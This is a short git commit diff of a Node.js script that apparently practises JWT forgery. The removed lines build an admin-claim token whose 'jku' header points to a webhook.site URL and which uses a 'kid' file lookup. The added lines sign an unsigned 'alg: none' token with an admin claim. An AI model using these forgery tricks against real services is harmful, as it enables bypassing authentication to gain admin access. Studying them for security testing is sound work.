8beabc54a499c4b1f5bc82835b653372165ca3f4
Đặng Khánh AT18 A <kelvinkhanh192@gmail.com>
2024-04-28 14:11:59 +0700

    update

--- src/app1.js
+++ src/app1.js
@@ -1,29 +1,7 @@
 import jwt from "jsonwebtoken"
-// import fs from "fs"
-// import { fileURLToPath } from 'url'
-// import path from "path"
-// const __filename = fileURLToPath(import.meta.url)
-// const __dirname = path.dirname(__filename)
 
-
-const header = {
-    kid : "6f597b7-fd81-44c7-956f-6937ea94cdf6",
-    alg: 'HS256', // Algorithm
-    typ: 'JWT' ,   // Type
-    jku : 'https://webhook.site/ef25db63-2fb1-4961-8eec-8e75d4dff6df'
-};
-const token = jwt.sign({"isadmin": "true"},'yxwbWAgScjCTF6xE1lXkiQ',{algorithm: 'RS256',expiresIn: '5d' ,header })
-
-// // console.log(token)
-// const decodedToken = jwt.decode(token, { complete: true });
-// const header1 = decodedToken.header
-// console.log(header1)
-// // console.log(path.join(__dirname,'/helper/key/',header1.kid))
-// fs.readFile(path.join(__dirname,'/helper/key/',header1.kid),'utf-8' ,function(err,data){
-//     // console.log(data)
-// })
-
-// const token ="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc2FkbWluIjoidHJ1ZSIsImlhdCI6MTcxNDEzMTA0NCwiZXhwIjoxNzE0NTYzMDQ0fQ.k6hRCKxo3IFif1Fe9RyD6DyxK5n5blifZTxs0uqd5ls"
+const token  = jwt.sign({"isadmmin" : "true"},"supersecure",{algorithm : "none"})
 console.log(token)
-const decoded = jwt.verify(token, 'yxwbWAgScjCTF6xE1lXkiQ')
-console.log(decoded)
+// const token = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpc2FkbW1pbiI6InRydWUiLCJpYXQiOjE3MTQyMTMxMDd9.U9c2k1dHJrlHYRJ8i-fUH5m_v6n_CqQlvuynyzlDUqQ'
+const decode = jwt.verify(token)
+console.log(decode)
